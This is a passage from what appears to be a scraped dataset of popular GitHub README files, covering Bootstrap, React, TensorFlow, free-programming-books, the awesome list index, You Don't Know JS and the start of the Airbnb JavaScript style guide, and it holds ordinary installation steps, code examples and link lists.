sure to set debug: true in site/static/docs/4.3/assets/js/src/search.js file.\nRunning documentation locally\n\nRun npm install to install the Node.js dependencies, including Hugo (the site builder).\nRun npm run test (or a specific npm script) to rebuild distributed CSS and JavaScript files, as well as our docs assets.\nFrom the root /bootstrap directory, run npm run docs-serve in the command line.\nOpen http://localhost:9001/ in your browser, and voil\u00e0.\n\nLearn more about using Hugo by reading its documentation.\nDocumentation for previous releases\nYou can find all our previous releases docs on https://getbootstrap.com/docs/versions/.\nPrevious releases and their documentation are also available for download.\nContributing\nPlease read through our contributing guidelines. Included are directions for opening issues, coding standards, and notes on development.\nMoreover, if your pull request contains JavaScript patches or features, you must include relevant unit tests. All HTML and CSS should conform to the Code Guide, maintained by Mark Otto.\nEditor preferences are available in the editor config for easy use in common text editors. Read more and download plugins at https://editorconfig.org/.\nCommunity\nGet updates on Bootstrap's development and chat with the project maintainers and community members.\n\nFollow @getbootstrap on Twitter.\nRead and subscribe to The Official Bootstrap Blog.\nJoin the official Slack room.\nChat with fellow Bootstrappers in IRC. On the irc.freenode.net server, in the ##bootstrap channel.\nImplementation help may be found at Stack Overflow (tagged bootstrap-4).\nDevelopers should use the keyword bootstrap on packages which modify or add to the functionality of Bootstrap when distributing through npm or similar delivery mechanisms for maximum discoverability.\n\nVersioning\nFor transparency into our release cycle and in striving to maintain backward compatibility, Bootstrap is maintained under the Semantic Versioning guidelines. Sometimes we screw up, but we adhere to those rules whenever possible.\nSee the Releases section of our GitHub project for changelogs for each release version of Bootstrap. Release announcement posts on the official Bootstrap blog contain summaries of the most noteworthy changes made in each release.\nCreators\nMark Otto\n\nhttps://twitter.com/mdo\nhttps://github.com/mdo\n\nJacob Thornton\n\nhttps://twitter.com/fat\nhttps://github.com/fat\n\nThanks\n\n\n\nThanks to BrowserStack for providing the infrastructure that allows us to test in real browsers!\nBackers\nThank you to all our backers! \ud83d\ude4f [Become a backer]\n\nSponsors\nSupport this project by becoming a sponsor. Your logo will show up here with a link to your website. [Become a sponsor]\n\n\n\n\n\n\n\n\n\n\nCopyright and license\nCode and documentation copyright 2011-2019 the Bootstrap Authors and Twitter, Inc. Code released under the MIT License. Docs released under Creative Commons."}, {"title": "facebook/react", "language": "JavaScript", "content": "React \u00b7    \nReact is a JavaScript library for building user interfaces.\n\nDeclarative: React makes it painless to create interactive UIs. Design simple views for each state in your application, and React will efficiently update and render just the right components when your data changes. Declarative views make your code more predictable, simpler to understand, and easier to debug.\nComponent-Based: Build encapsulated components that manage their own state, then compose them to make complex UIs. Since component logic is written in JavaScript instead of templates, you can easily pass rich data through your app and keep state out of the DOM.\nLearn Once, Write Anywhere: We don't make assumptions about the rest of your technology stack, so you can develop new features in React without rewriting existing code. React can also render on the server using Node and power mobile apps using React Native.\n\nLearn how to use React in your own project.\nInstallation\nReact has been designed for gradual adoption from the start, and you can use as little or as much React as you need:\n\nUse Online Playgrounds to get a taste of React.\nAdd React to a Website as a <script> tag in one minute.\nCreate a New React App if you're looking for a powerful JavaScript toolchain.\n\nYou can use React as a <script> tag from a CDN, or as a react package on npm.\nDocumentation\nYou can find the React documentation on the website.\nCheck out the Getting Started page for a quick overview.\nThe documentation is divided into several sections:\n\nTutorial\nMain Concepts\nAdvanced Guides\nAPI Reference\nWhere to Get Support\nContributing Guide\n\nYou can improve it by sending pull requests to this repository.\nExamples\nWe have several examples on the website. Here is the first one to get you started:\nfunction HelloMessage({ name }) {\n  return <div>Hello {name}</div>;\n}\n\nReactDOM.render(\n  <HelloMessage name=\"Taylor\" />,\n  document.getElementById('container')\n);\nThis example will render \"Hello Taylor\" into a container on the page.\nYou'll notice that we used an HTML-like syntax; we call it JSX. JSX is not required to use React, but it makes code more readable, and writing it feels like writing HTML. If you're using React as a <script> tag, read this section on integrating JSX; otherwise, the recommended JavaScript toolchains handle it automatically.\nContributing\nThe main purpose of this repository is to continue to evolve React core, making it faster and easier to use. Development of React happens in the open on GitHub, and we are grateful to the community for contributing bugfixes and improvements. Read below to learn how you can take part in improving React.\nCode of Conduct\nFacebook has adopted a Code of Conduct that we expect project participants to adhere to. Please read the full text so that you can understand what actions will and will not be tolerated.\nContributing Guide\nRead our contributing guide to learn about our development process, how to propose bugfixes and improvements, and how to build and test your changes to React.\nGood First Issues\nTo help you get your feet wet and get you familiar with our contribution process, we have a list of good first issues that contain bugs which have a relatively limited scope. This is a great place to get started.\nLicense\nReact is MIT licensed."}, {"title": "tensorflow/tensorflow", "language": "C++", "content": "Documentation\n\n\n\n\n\n\n\n\nTensorFlow is an open source software library for numerical computation\nusing data flow graphs. The graph nodes represent mathematical operations, while\nthe graph edges represent the multidimensional data arrays (tensors) that flow\nbetween them. This flexible architecture enables you to deploy computation to\none or more CPUs or GPUs in a desktop, server, or mobile device without\nrewriting code. TensorFlow also includes\nTensorBoard, a data visualization\ntoolkit.\nTensorFlow was originally developed by researchers and engineers\nworking on the Google Brain team within Google's Machine Intelligence Research\norganization for the purposes of conducting machine learning and deep neural\nnetworks research.  The system is general enough to be applicable in a wide\nvariety of other domains, as well.\nTensorFlow provides stable Python and C APIs as well as non-guaranteed backwards\ncompatible API's for C++, Go, Java, JavaScript, and Swift.\nKeep up to date with release announcements and security updates by\nsubscribing to\nannounce@tensorflow.org.\nInstallation\nTo install the current release for CPU-only:\npip install tensorflow\n\nUse the GPU package for CUDA-enabled GPU cards:\npip install tensorflow-gpu\n\nSee Installing TensorFlow for detailed\ninstructions, and how to build from source.\nPeople who are a little more adventurous can also try our nightly binaries:\nNightly pip packages * We are pleased to announce that TensorFlow now offers\nnightly pip packages under the\ntf-nightly and\ntf-nightly-gpu project on PyPi.\nSimply run pip install tf-nightly or pip install tf-nightly-gpu in a clean\nenvironment to install the nightly TensorFlow build. We support CPU and GPU\npackages on Linux, Mac, and Windows.\nTry your first TensorFlow program\n$ python\n>>> import tensorflow as tf\n>>> tf.enable_eager_execution()\n>>> tf.add(1, 2).numpy()\n3\n>>> hello = tf.constant('Hello, TensorFlow!')\n>>> hello.numpy()\n'Hello, TensorFlow!'\nLearn more examples about how to do specific tasks in TensorFlow at the\ntutorials page of tensorflow.org.\nContribution guidelines\nIf you want to contribute to TensorFlow, be sure to review the contribution\nguidelines. This project adheres to TensorFlow's\ncode of conduct. By participating, you are expected to\nuphold this code.\nWe use GitHub issues for\ntracking requests and bugs, please see\nTensorFlow Discuss\nfor general questions and discussion, and please direct specific questions to\nStack Overflow.\nThe TensorFlow project strives to abide by generally accepted best practices in open-source software development:\n\nContinuous build status\nOfficial Builds\n\n\n\nBuild Type\nStatus\nArtifacts\n\n\n\n\nLinux CPU\n\npypi\n\n\nLinux GPU\n\npypi\n\n\nLinux XLA\n\nTBA\n\n\nMacOS\n\npypi\n\n\nWindows CPU\n\npypi\n\n\nWindows GPU\n\npypi\n\n\nAndroid\n\n\n\n\nRaspberry Pi 0 and 1\n \nPy2 Py3\n\n\nRaspberry Pi 2 and 3\n \nPy2 Py3\n\n\n\nCommunity Supported Builds\n\n\n\nBuild Type\nStatus\nArtifacts\n\n\n\n\nIBM s390x\n\nTBA\n\n\nLinux ppc64le CPU Nightly\n\nNightly\n\n\nLinux ppc64le CPU Stable Release\n\nRelease\n\n\nLinux ppc64le GPU Nightly\n\nNightly\n\n\nLinux ppc64le GPU Stable Release\n\nRelease\n\n\nLinux CPU with Intel\u00ae MKL-DNN Nightly\n\nNightly\n\n\nLinux CPU with Intel\u00ae MKL-DNN  Supports Python 2.7, 3.4, 3.5, and 3.6\n\n1.13.1 pypi\n\n\nRed Hat\u00ae Enterprise Linux\u00ae 7.6 CPU & GPU  Python 2.7, 3.6\n\n1.13.1 pypi\n\n\n\nFor more information\n\nTensorFlow Website\nTensorFlow Tutorials\nTensorFlow Model Zoo\nTensorFlow Twitter\nTensorFlow Blog\nTensorFlow Course at Stanford\nTensorFlow Roadmap\nTensorFlow White Papers\nTensorFlow YouTube Channel\nTensorFlow Visualization Toolkit\n\nLearn more about the TensorFlow community at the community page of tensorflow.org for a few ways to participate.\nLicense\nApache License 2.0"}, {"title": "EbookFoundation/free-programming-books", "language": "C++", "content": "This page is available as an easy-to-read website at https://ebookfoundation.github.io/.\nList of Free Learning Resources \nView the English list\nIntro\nThis list was originally a clone of stackoverflow - List of Freely Available Programming Books with contributions from Karan Bhangui and George Stocker.\nThe list was moved to GitHub by Victor Felder for collaborative updating and maintenance. It has grown to become one of the most popular repositories on Github, with over 100,000 stars, over 4500 commits, over 950 contributors, and over 25,000 forks.\nThe repo is now administered by the Free Ebook Foundation, a not-for-profit organization devoted to promoting the creation, distribution, archiving and sustainability of free ebooks. Donations to the Free Ebook Foundation are tax-deductible in the US.\nHow To Contribute\nPlease read CONTRIBUTING. If you're new to Github, welcome!\nHow to Share\n\nShare on Twitter\nShare on Facebook\nShare on Google Plus\nShare on LinkedIn\nShare on Telegram\n\nIn Other Written Languages\n\nArabic\nAzerbaijani\nBengali\nBulgarian\nBurmese\nChinese\nCzech\nDutch\nEnglish\nFrench\nGerman\nGreek\nHungarian\nIndonesian\nItalian\nJapanese\nKorean\nPersian/Farsi (Iran)\nPolish\nPortuguese (Brazil)\nPortuguese (Portugal)\nRomanian (Romania)\nRussian\nSlovak\nSpanish\nSwedish\nTurkish\nUkrainian\n\nFree Online Courses\n\nBulgarian\nEnglish\nFinnish\nGerman\nItalian\nPolish\nPortuguese (Brazil)\nRussian\nSpanish\nVietnamese\n\nInteractive Programming Resources\n\nEnglish\nRussian\n\nProblem Sets and Competitive Programming\n\nProblem Sets\n\nPodcast - Screencast\nFree Podcasts and Screencasts:\n\nCzech\nEnglish\nPortuguese (Brazil)\nRussian\nSwedish\n\nProgramming Playgrounds\n\nFree Programming Playgrounds\n\nLicense\nEach file included in this repository is licensed under the CC BY License."}, {"title": "sindresorhus/awesome", "language": "C++", "content": "My open source work is supported by the community\n\n\n\n\n\n\n\n\n\nWhat is an awesome list?\u00a0\u00a0\u00a0\n\tContribution guide\u00a0\u00a0\u00a0\n\tCreating a list\u00a0\u00a0\u00a0\n\tTwitter\u00a0\u00a0\u00a0\n\tStickers & t-shirts\n\n\n\nFollow the Awesome Twitter account for updates on new list additions.\n\n\n\nJust type awesome.re to go here. Check out my blog and follow me on Twitter.\n\n\nContents\n\nPlatforms\nProgramming Languages\nFront-End Development\nBack-End Development\nComputer Science\nBig Data\nTheory\nBooks\nEditors\nGaming\nDevelopment Environment\nEntertainment\nDatabases\nMedia\nLearn\nSecurity\nContent Management Systems\nHardware\nBusiness\nWork\nNetworking\nDecentralized Systems\nMiscellaneous\nRelated\n\nPlatforms\n\nNode.js - Async non-blocking event-driven JavaScript runtime built on Chrome's V8 JavaScript engine.\n\nCross-Platform - Writing cross-platform code on Node.js.\n\n\nFrontend Development\niOS - Mobile operating system for Apple phones and tablets.\nAndroid\nIoT & Hybrid Apps\nElectron - Cross-platform native desktop apps using JavaScript/HTML/CSS.\nCordova - JavaScript API for hybrid apps.\nReact Native\nXamarin - Mobile app development IDE, testing, and distribution.\nLinux\n\nContainers\n\n\nmacOS\n\nCommand-Line\nScreensavers\nApps\nOpen Source Apps\n\n\nwatchOS - Operating system for the Apple Watch.\nJVM\nSalesforce\nAmazon Web Services\nWindows\nIPFS - P2P hypermedia protocol.\nFuse - Mobile development tools.\nHeroku - Cloud platform as a service.\nRaspberry Pi - Credit card-sized computer aimed at teaching kids programming, but capable of a lot more.\nQt - Cross-platform GUI app framework.\nWebExtensions - Cross-browser extension system.\nRubyMotion - Write cross-platform native apps for iOS, Android, macOS, tvOS, and watchOS in Ruby.\nSmart TV - Create apps for different TV platforms.\nGNOME - Simple and distraction-free desktop environment for Linux.\nKDE - A free software community dedicated to creating an open and user-friendly computing experience.\n.NET\n\nCore\n\n\nAmazon Alexa - Virtual home assistant.\nDigitalOcean - Cloud computing platform designed for developers.\nFlutter - Google's mobile SDK for building native iOS and Android apps from a single codebase written in Dart.\nHome Assistant - Open source home automation that puts local control and privacy first.\nIBM Cloud - Cloud platform for developers and companies.\nFirebase - App development platform built on Google Cloud Platform.\nRobot Operating System 2.0 - Set of software libraries and tools that help you build robot apps.\n\nProgramming Languages\n\nJavaScript\n\nPromises\nStandard Style - Style guide and linter.\nMust Watch Talks\nTips\nNetwork Layer\nMicro npm Packages\nMad Science npm Packages - Impossible sounding projects that exist.\nMaintenance Modules - For npm packages.\nnpm - Package manager.\nAVA - Test runner.\nESLint - Linter.\nFunctional Programming\nObservables\nnpm scripts - Task runner.\n30 Seconds of Code - Code snippets you can understand in 30 seconds.\n\n\nSwift\n\nEducation\nPlaygrounds\n\n\nPython\n\nAsyncio - Asynchronous I/O in Python 3.\nScientific Audio - Scientific research in audio/music.\nCircuitPython - A version of Python for microcontrollers.\n\n\nRust\nHaskell\nPureScript\nGo\nScala\nRuby\nClojure\nClojureScript\nElixir\nElm\nErlang\nJulia\nLua\nC\nC/C++\nR\nD\nCommon Lisp\nPerl\nGroovy\nDart\nJava\n\nRxJava\n\n\nKotlin\nOCaml\nColdFusion\nFortran\nPHP\n\nComposer - Package manager.\n\n\nDelphi\nAssembler\nAutoHotkey\nAutoIt\nCrystal\nFrege - Haskell for the JVM.\nCMake - Build, test, and package software.\nActionScript 3 - Object-oriented language targeting Adobe AIR.\nEta - Functional programming language for the JVM.\nIdris - General purpose pure functional programming language with dependent types influenced by Haskell and ML.\nAda/SPARK - Modern programming language designed for large, long-lived apps where reliability and efficiency are essential.\nQ# - Domain-specific programming language used for expressing quantum algorithms.\n\nFront-End Development\n\nES6 Tools\nWeb Performance Optimization\nWeb Tools\nCSS\n\nCritical-Path Tools\nScalability\nMust-Watch Talks\nProtips\nFrameworks\n\n\nReact - App framework.\n\nRelay - Framework for building data-driven React apps.\n\n\nWeb Components\nPolymer - JavaScript library to develop Web Components.\nAngular - App framework.\nBackbone - App framework.\nHTML5 - Markup language used for websites & web apps.\nSVG - XML-based vector image format.\nCanvas\nKnockoutJS\nDojo Toolkit\nInspiration\nEmber - App framework.\nAndroid UI\niOS UI\nMeteor\nBEM\nFlexbox\nWeb Typography\nWeb Accessibility\nMaterial Design\nD3 - Library for producing dynamic, interactive data visualizations.\nEmails\njQuery - Easy to use JavaScript library for DOM manipulation.\n\nTips\n\n\nWeb Audio\nOffline-First\nStatic Website Services\nCycle.js - Functional and reactive JavaScript framework.\nText Editing\nMotion UI Design\nVue.js - App framework.\nMarionette.js - App framework.\nAurelia - App framework.\nCharting\nIonic Framework 2\nChrome DevTools\nPostCSS - CSS tool.\nDraft.js - Rich text editor framework for React.\nService Workers\nProgressive Web Apps\nchoo - App framework.\nRedux - State container for JavaScript apps.\nwebpack - Module bundler.\nBrowserify - Module bundler.\nSass - CSS preprocessor.\nAnt Design - Enterprise-class UI design language.\nLess - CSS preprocessor.\nWebGL - JavaScript API for rendering 3D graphics.\nPreact - App framework.\nProgressive Enhancement\nNext.js - Framework for server-rendered React apps.\nHyperapp - Tiny JavaScript library for building web apps.\nlit-html - HTML templating library for JavaScript.\nJAMstack - Modern web development architecture based on client-side JavaScript, reusable APIs, and prebuilt markup.\nMobile Web Development - Creating a great mobile web experience.\n\nBack-End Development\n\nFlask\nDocker\nVagrant\nPyramid\nPlay1 Framework\nCakePHP - PHP framework.\nSymfony\n\nEducation\n\n\nLaravel - PHP framework.\n\nEducation\n\n\nRails - Web app framework for Ruby.\n\nGems - Packages.\n\n\nPhalcon\nUseful .htaccess Snippets\nnginx - Web server.\nDropwizard\nKubernetes\nLumen\nServerless Framework\nApache Wicket - Java web app framework.\nVert.x - Toolkit for building reactive apps on the JVM.\nTerraform - Tool for building, changing, and versioning infrastructure.\nVapor - Server-side development in Swift.\nDash - Python web app framework.\n\nComputer Science\n\nUniversity Courses\nData Science\n\nTutorials\n\n\nMachine Learning\n\nTutorials\nML with Ruby - Learning, implementing, and applying Machine Learning using Ruby.\nCore ML Models - Models for Apple's machine learning framework.\nH2O - Open source distributed machine learning platform written in Java with APIs in R, Python, and Scala.\n\n\nSpeech and Natural Language Processing\n\nSpanish\nNLP with Ruby\nQuestion Answering - The science of asking and answering in natural language with a machine.\n\n\nLinguistics\nCryptography\n\nPapers - Theory basics for using cryptography by non-cryptographers.\n\n\nComputer Vision\nDeep Learning - Neural networks.\n\nTensorFlow - Library for machine intelligence.\nPapers - The most cited deep learning papers.\nEducation\n\n\nDeep Vision\nOpen Source Society University\nFunctional Programming\nEmpirical Software Engineering - Evidence-based research on software systems.\nStatic Analysis & Code Quality\nInformation Retrieval - Learn to develop your own search engine.\n\nBig Data\n\nBig Data\nPublic Datasets\nHadoop - Framework for distributed storage and processing of very large data sets.\nData Engineering\nStreaming\nApache Spark - Unified engine for large-scale data processing.\n\nTheory\n\nPapers We Love\nTalks\nAlgorithms\nAlgorithm Visualizations\nArtificial Intelligence\nSearch Engine Optimization\nCompetitive Programming\nMath\nRecursion Schemes - Traversing nested data structures.\n\nBooks\n\nFree Programming Books\nFree Software Testing Books\nGo Books\nR Books\nMind Expanding Books\nBook Authoring\nElixir Books\n\nEditors\n\nSublime Text\nVim\nEmacs\nAtom - Open-source and hackable text editor.\nVisual Studio Code - Cross-platform open-source text editor.\n\nGaming\n\nGame Development\nGame Networking - Network programming for multiplayer online games.\nGame Talks\nGodot - Game engine.\nOpen Source Games\nUnity - Game engine.\nChess\nL\u00d6VE - Game engine.\nPICO-8 - Fantasy console.\nGame Boy Development\nConstruct 2 - Game engine.\nGideros - Game engine.\nMinecraft - Sandbox video game.\n\nDevelopment Environment\n\nQuick Look Plugins - For macOS.\nDev Env\nDotfiles\nShell\nFish - User-friendly shell.\nCommand-Line Apps\nZSH Plugins\nGitHub - Hosting service for Git repositories.\n\nBrowser Extensions\nCheat Sheet\n\n\nGit Cheat Sheet & Git Flow\nGit Tips\nGit Add-ons - Enhance the git CLI.\nSSH\nFOSS for Developers\nHyper - Cross-platform terminal app built on web technologies.\nPowerShell - Cross-platform object-oriented shell.\nAlfred Workflows - Productivity app for macOS.\nTerminals Are Sexy\n\nEntertainment\n\nScience Fiction - Scifi.\nFantasy\nPodcasts\nEmail Newsletters\nIT Quotes\n\nDatabases\n\nDatabase\nMySQL\nSQLAlchemy\nInfluxDB\nNeo4j\nMongoDB - NoSQL database.\nRethinkDB\nTinkerPop - Graph computing framework.\nPostgreSQL - Object-relational database.\nCouchDB - Document-oriented NoSQL database.\nHBase - Distributed, scalable, big data store.\nNoSQL Guides - Help on using non-relational, distributed, open-source, and horizontally scalable databases.\n\nMedia\n\nCreative Commons Media\nFonts\nCodeface - Text editor fonts.\nStock Resources\nGIF - Image format known for animated images.\nMusic\nOpen Source Documents\nAudio Visualization\nBroadcasting\nPixel Art - Pixel-level digital art.\nFFmpeg - Cross-platform solution to record, convert and stream audio and video.\n\nLearn\n\nCLI Workshoppers - Interactive tutorials.\nLearn to Program\nSpeaking\nTech Videos\nDive into Machine Learning\nComputer History\nProgramming for Kids\nEducational Games - Learn while playing.\nJavaScript Learning\nCSS Learning - Mainly about CSS \u2013 the language and the modules.\n\nSecurity\n\nApplication Security\nSecurity\nCTF - Capture The Flag.\nMalware Analysis\nAndroid Security\nHacking\nHoneypots - Deception trap, designed to entice an attacker into attempting to compromise the information systems in an organization.\nIncident Response\nVehicle Security and Car Hacking\nWeb Security - Security of web apps & services.\nLockpicking - The art of unlocking a lock by manipulating its components without the key.\nCybersecurity Blue Team - Groups of individuals who identify security flaws in information technology systems.\n\nContent Management Systems\n\nUmbraco\nRefinery CMS - Ruby on Rails CMS.\nWagtail - Django CMS focused on flexibility and user experience.\nTextpattern - Lightweight PHP-based CMS.\nDrupal - Extensible PHP-based CMS.\nCraft CMS - Content-first CMS.\n\nHardware\n\nRobotics\nInternet of Things\nElectronics - For electronic engineers and hobbyists.\nBluetooth Beacons\nElectric Guitar Specifications - Checklist for building your own electric guitar.\n\nBusiness\n\nOpen Companies\nPlaces to Post Your Startup\nOKR Methodology - Goal setting & communication best practices.\nLeading and Managing - Leading people and being a manager in a technology company/environment.\nIndie - Independent developer businesses.\n\nWork\n\nSlack - Team collaboration.\n\nCommunities\n\n\nRemote Jobs\nProductivity\nNiche Job Boards\nProgramming Interviews\nCode Review - Reviewing code.\n\nNetworking\n\nSoftware-Defined Networking\nNetwork Analysis\nPCAPTools\n\nDecentralized Systems\n\nBitcoin - Bitcoin services and tools for software developers.\nRipple - Open source distributed settlement network.\nNon-Financial Blockchain - Non-financial blockchain applications.\nMastodon - Open source decentralized microblogging network.\nEthereum - Distributed computing platform for smart contract development.\nBlockchain AI - Blockchain projects for artificial intelligence and machine learning.\nEOSIO - A decentralized operating system supporting industrial-scale apps.\n\nMiscellaneous\n\nJSON - Text based data interchange format.\n\nGeoJSON\nDatasets\n\n\nDiscounts for Student Developers\nSysadmin\nRadio\nAwesome - Recursion illustrated.\nAnalytics\nREST\nSelenium\nAppium - Test automation tool for apps.\nContinuous Integration and Continuous Delivery\nServices Engineering\nFree for Developers\nAnswers - Stack Overflow, Quora, etc.\nSketch - Design app for macOS.\nBoilerplate Projects\nReadme\nTools\nDesign and Development Guides\nSoftware Engineering Blogs\nSelf Hosted\nFOSS Production Apps\nGulp - Task runner.\nAMA - Ask Me Anything.\n\nAnswers\n\n\nOpen Source Photography\nOpenGL - Cross-platform API for rendering 2D and 3D graphics.\nGraphQL\nTransit\nResearch Tools\nData Visualization\nSocial Media Share Links\nMicroservices\nUnicode - Unicode standards, quirks, packages and resources.\n\nCode Points\n\n\nBeginner-Friendly Projects\nKatas\nTools for Activism\nCitizen Science - For community-based and non-institutional scientists.\nTAP - Test Anything Protocol.\nMQTT - \"Internet of Things\" connectivity protocol.\nHacking Spots\nFor Girls\nVorpal - Node.js CLI framework.\nVulkan - Low-overhead, cross-platform 3D graphics and compute API.\nLaTeX - Typesetting language.\nEconomics - An economist's starter kit.\nFunny Markov Chains\nBioinformatics\nCheminformatics - Informatics techniques applied to problems in chemistry.\nColorful - Choose your next color scheme.\nSteam - Digital distribution platform.\nBots - Building bots.\nSite Reliability Engineering\nEmpathy in Engineering - Building and promoting more compassionate engineering cultures.\nDTrace - Dynamic tracing framework.\nUserscripts - Enhance your browsing experience.\nPok\u00e9mon - Pok\u00e9mon and Pok\u00e9mon GO.\nChatOps - Managing technical and business operations through a chat.\nFalsehood - Falsehoods programmers believe in.\nDomain-Driven Design - Software development approach for complex needs by connecting the implementation to an evolving model.\nQuantified Self - Self-tracking through technology.\nSaltStack - Python-based config management system.\nWeb Design - For digital designers.\nJMeter - Load testing and performance measurement tool.\nCreative Coding - Programming something expressive instead of something functional.\nNo-Login Web Apps - Web apps that work without login.\nTesting - Software testing.\nFree Software - Free as in freedom.\nFramer - Prototyping interactive UI designs.\nMarkdown - Markup language.\nDev Fun - Funny developer projects.\nEvents in the Netherlands - Tech-related events in the Netherlands.\nHealthcare - Open source healthcare software for facilities, providers, developers, policy experts, and researchers.\nMagento 2 - Open Source eCommerce built with PHP.\nTikZ - Graph drawing packages for TeX/LaTeX/ConTeXt.\nNeuroscience - Study of the nervous system and brain.\nAd-Free - Ad-free alternatives.\nEsolangs - Programming languages designed for experimentation or as jokes rather than actual use.\nPrometheus - Open-source monitoring system.\nHomematic - Smart home devices.\nLedger - Double-entry accounting on the command-line.\nUncopyright - Public domain works.\nCrypto Currency Tools & Algorithms - Digital currency where encryption is used to regulate the generation of units and verify transfers.\nDiversity - Creating a more inclusive and diverse tech community.\nOpen Source Supporters - Companies that offer their tools and services for free to open source projects.\nDesign Principles - Create better and more consistent designs and experiences.\nVisual Regression Testing - Ensures changes did not break the functionality or style.\nTheravada - Teachings from the Theravada Buddhist tradition.\ninspectIT - Open source Java app performance management tool.\nOpen Source Maintainers - The experience of being an open source maintainer.\nCalculators - Calculators for every platform.\nCaptcha - A type of challenge\u2013response test used in computing to determine whether or not the user is human.\nJupyter - Create and share documents that contain code, equations, visualizations and narrative text.\nFIRST Robotics Competition - International high school robotics championship.\nHumane Technology - Open source projects that help improve society.\nSpeakers - Conference and meetup speakers in the programming and design community.\nBoard Games - Table-top gaming fun for all.\nSoftware Patreons - Fund individual programmers or the development of open source projects.\nParasite - Parasites and host-pathogen interactions.\nFood - Food-related projects on GitHub.\nMental Health - Mental health awareness and self-care in the software industry.\nBitcoin Payment Processors - Start accepting Bitcoin.\nScientific Computing - Solving complex scientific problems using computers.\nAmazon Sellers\nAgriculture - Open source technology for farming and gardening.\nPlotters - Computer-controlled drawing machines and other visual art robots.\nProduct Design \u2014 Design a product from the initial concept to production.\nPrisma - Turn your database into a GraphQL API.\nSoftware Architecture - The discipline of designing and building software.\n\nRelated\n\nAwesome Indexed - Search the Awesome dataset.\nAwesome Search - Quick search for Awesome lists.\n\nLicense\n\nTo the extent possible under law, Sindre Sorhus has waived all copyright and related or neighboring rights to this work."}, {"title": "getify/You-Dont-Know-JS", "language": "C++", "content": "You Don't Know JS (book series)\nThis is a series of books diving deep into the core mechanisms of the JavaScript language. The first edition of the series is now complete.\n\u00a0\n\u00a0\n\u00a0\n\u00a0\n\u00a0\n\nPlease feel free to contribute to the quality of this content by submitting PR's for improvements to code snippets, explanations, etc. While typo fixes are welcomed, they will likely be caught through normal editing processes, and are thus not necessarily as important for this repository.\nTo read more about the motivations and perspective behind this book series, check out the Preface.\nTitles\n\nRead online (free!): \"Up & Going\", Published: Buy Now in print, but the ebook format is free!\nRead online (free!): \"Scope & Closures\", Published: Buy Now\nRead online (free!): \"this & Object Prototypes\", Published: Buy Now\nRead online (free!): \"Types & Grammar\", Published: Buy Now\nRead online (free!): \"Async & Performance\", Published: Buy Now\nRead online (free!): \"ES6 & Beyond\", Published: Buy Now\n\nPublishing\nThese books are being released here as drafts, free to read, but are also being edited, produced, and published through O'Reilly.\nIf you like the content you find here, and want to support more content like it, please purchase the books once they are available for sale, through your normal book sources. :)\nIf you'd like to contribute financially towards the effort (or any of my other OSS work) aside from purchasing the books, I do have a patreon that I would always appreciate your generosity towards.\n\nIn-person Training\nThe content for these books derives heavily from a series of training materials I teach professionally (in both public and private-corporate workshop format): \"Deep JavaScript Foundations\", \"Rethinking Async\", and \"ES6: The Right Parts\" workshops.\nIf you like this content and would like to contact me regarding conducting training on these, or other various JS/HTML5/node.js topics, please reach out to me through email: getify @ gmail\nOnline Video Training\nI also have some JS training material available in on-demand video format. I teach courses through Frontend Masters, like my Deep JavaScript Foundations workshop. You can find all my courses here.\nSome of those courses are also distributed on other platforms, like Pluralsight, Lynda.com, and O'Reilly Safari Online.\nContributions\nAny contributions you make to this effort are of course greatly appreciated.\nBut PLEASE read the Contributions Guidelines carefully before submitting a PR.\nLicense & Copyright\nThe materials herein are all \u00a9 2013-2018 Kyle Simpson.\nThis work is licensed under a Creative Commons Attribution-NonCommercial-NoDerivs 4.0 Unported License."}, {"title": "airbnb/javascript", "language": "JavaScript", "content": "Airbnb JavaScript Style Guide() {\nA mostly reasonable approach to JavaScript\n\nNote: this guide assumes you are using Babel, and requires that you use babel-preset-airbnb or the equivalent. It also assumes you are installing shims/polyfills in your app, with airbnb-browser-shims or the equivalent.\n\n\n\n\nThis guide is available in other languages too. See Translation\nOther Style Guides\n\nES5 (Deprecated)\nReact\nCSS-in-JavaScript\nCSS & Sass\nRuby\n\nTable of Contents\n\nTypes\nReferences\nObjects\nArrays\nDestructuring\nStrings\nFunctions\nArrow Functions\nClasses & Constructors\nModules\nIterators and Generators\nProperties\nVariables\nHoisting\nComparison Operators & Equality\nBlocks\nControl Statements\nComments\nWhitespace\nCommas\nSemicolons\nType Casting & Coercion\nNaming Conventions\nAccessors\nEvents\njQuery\nECMAScript 5 Compatibility\nECMAScript 6+ (ES 2015+) Styles\nStandard Library\nTesting\nPerformance\nResources\nIn the Wild\nTranslation\nThe JavaScript Style Guide Guide\nChat With Us About JavaScript\nContributors\nLicense\nAmendments\n\nTypes\n\n\n\n1.1 Primitives: When you access a primitive type you work directly on its value.\n\nstring\nnumber\nboolean\nnull\nundefined\nsymbol\n\nconst foo = 1;\nlet bar = foo;\n\nbar = 9;\n\nconsole.log(foo, bar); // => 1, 9\n\nSymbols cannot be faithfully polyfilled, so they should not be used when targeting browsers/environments that don\u2019t support them natively.\n\n\n\n\n\n\n1.2 Complex: When you access a complex type you work on a reference to its value.\n\nobject\narray\nfunction\n\nconst foo = [1, 2];\nconst bar = foo;\n\nbar[0] = 9;\n\nconsole.log(foo[0], bar[0]); // => 9, 9\n\n\n\u2b06 back to top\nReferences\n\n\n\n2.1 Use const for all of your references; avoid using var. eslint: prefer-const, no-const-assign\n\nWhy? This ensures that you can\u2019t reassign your references, which can lead to bugs and difficult to comprehend code.\n\n// bad\nvar a = 1;\nvar b = 2;\n\n// good\nconst a = 1;\nconst b = 2;\n\n\n\n\n\n2.2 If you must reassign references, use let instead of var. eslint: no-var\n\nWhy? let is block-scoped rather than function-scoped like var.\n\n// bad\nvar count = 1;\nif (true) {\n  count += 1;\n}\n\n// good, use the let.\nlet count = 1;\nif (true) {\n  count += 1;\n}\n\n\n\n\n\n2.3 Note that both let and const are block-scoped.\n// const and let only exist in the blocks they are defined in.\n{\n  let a = 1;\n  const b = 1;\n}\nconsole.log(a); // ReferenceError\nconsole.log(b); // ReferenceError\n\n\n\u2b06 back to top\nObjects\n\n\n\n3.1 Use the literal syntax for object creation. eslint: no-new-object\n// bad\nconst item = new Object();\n\n// good\nconst item = {};\n\n\n\n\n\n3.2 Use computed property names when creating objects with dynamic property names.\n\nWhy? They allow you to define all the properties of an object in one place.\n\nfunction getKey(k) {\n  return `a key named ${k}`;\n}\n\n// bad\nconst obj = {\n  id: 5,\n  name: 'San Francisco',\n};\nobj[getKey('enabled')] = true;\n\n// good\nconst obj = {\n  id: 5,\n  name: 'San Francisco',\n  [getKey('enabled')]: true,\n};\n\n\n\n\n\n3.3 Use object method shorthand. 